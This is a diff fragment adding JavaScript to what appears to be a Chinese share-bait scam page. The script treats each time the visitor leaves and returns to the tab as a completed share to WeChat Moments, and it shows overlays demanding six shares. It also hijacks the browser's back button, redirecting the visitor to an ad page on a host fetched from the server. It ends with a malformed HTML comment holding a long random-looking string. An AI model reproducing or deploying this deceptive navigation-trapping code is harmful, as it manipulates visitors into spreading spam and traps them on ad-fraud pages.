+        }
+
+        function step2Hide() {
+            document.getElementById('maskBg').style.display = 'none';
+            document.getElementById('step2FirstAlert').style.display = 'none';
+            document.getElementById('step2Alert').style.display = 'none';
+            document.getElementById('step2Share').style.display = 'none';
+            document.getElementById('step2Share1').style.display = 'none';
+            document.getElementById('step2Share2').style.display = 'none';
+            document.getElementById('step2Share3').style.display = 'none';
+            document.getElementById('step2Share4').style.display = 'none';
+            document.getElementById('step2Share5').style.display = 'none';
+            document.getElementById('step2Share6').style.display = 'none';
+            document.getElementById('step2Mask').style.display = 'none';
+        }
+
+
+        var shareNumber = 0;
+        var needShareNumber = 6;
+        var hiddenProperty = 'hidden' in document ? 'hidden' :
+            'webkitHidden' in document ? 'webkitHidden' :
+                'mozHidden' in document ? 'mozHidden' : null;
+        var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
+        document.addEventListener(visibilityChangeEvent, (e)=>{
+            if (!e.target[hiddenProperty]) {
+                shareNumber++;
+                if(4 <= shareNumber)
+                {
+                    curShareTraget = '朋友圈';
+                }
+                for(let i=0;i<shareTargetNodes.length;i++)
+                {
+                    shareTargetNodes[i].innerHTML=curShareTraget;
+                }
+                if(needShareNumber >= shareNumber)
+                {
+                    step2Hide();
+                    document.getElementById('maskBg').style.display = 'block';
+                    document.getElementById('step2Share').style.display = 'flex';
+                    document.getElementById('step2Share'+shareNumber).style.display = 'block';
+
+                    document.getElementById('step2Mask').style.display = 'block';
+                    this.helpType = 3;
+                    this.showHelp = true;
+                    // apiRequest('http://'+window.location.host+'/adb7?dda='+getQueryVariable('pdda'),'get',{},function(data){
+                    // })
+                }
+                if(needShareNumber == shareNumber)
+                {
+                    setTimeout(()=>{
+                        history.back();
+                    },4000)
+
+                }
+                if(needShareNumber <= shareNumber)
+                {
+                    shareNumber = needShareNumber;
+                }
+                // apiRequest('http://'+window.location.host+'/adb5?dda='+getQueryVariable('pdda'),'get',{},function(data){
+                // })
+            }
+        });
+
+
+        var adHost = '';
+        apiRequest('api/ad','GET',{}).then((data)=>{
+            adHost = data;
+        });
+        function pushHistory() {
+            var state = {
+                title: "title",
+                url: "#"
+            };
+            window.history.pushState(state, "title", "#");
+        }
+        window.addEventListener("popstate", function (e) {
+            pushHistory();
+            if('' == adHost)
+            {
+                return;
+            }
+            location.href = 'http://'+adHost+'/ad1.html';
+        }, false);
+
+
+        pushHistory();
+    }
+
+
+</script>< !--mkvqcv8GXbTdcyJKuYHaJjsRu05qQJj65kRwpLftPhZexFIrLJyQoxIH3rc4bNff71ZVsqtx88lKVM36T2utlhKNt8ggtGpksGPnp24yJJDs2zoe92WohBKFuIO5a9Ueh8aDPVytOUkKIdtmuHwCJ0uPyAsSO45doJwtmx4jWPmdFVtASksqmQXNPLoMnEIi7HEDBuStw1E0lKZ8HAaXz7BTxd6S8l4ExagMYVbPLK2QeXQ8QmCtwU4QJ3LFrORM96v6QdrMMpuH5ivdwUlphBUghsyzYMdcJq2JDxRjwpnUxgwW7A35kpzo9PtREKMLgeYSV2BEJgeGmOnysGhI6qzyzYwLAB2bWLsSYkdNZse8S5tho3NDk3aHRmRgiRYCIVzejjlECkhdF25RfYhA4fi9PxZhzQ6CSMEcJqcDcAGWovD48C9MYT8BXfWBBvQahKkqs0Bi0138cfmesSFXI4J-->
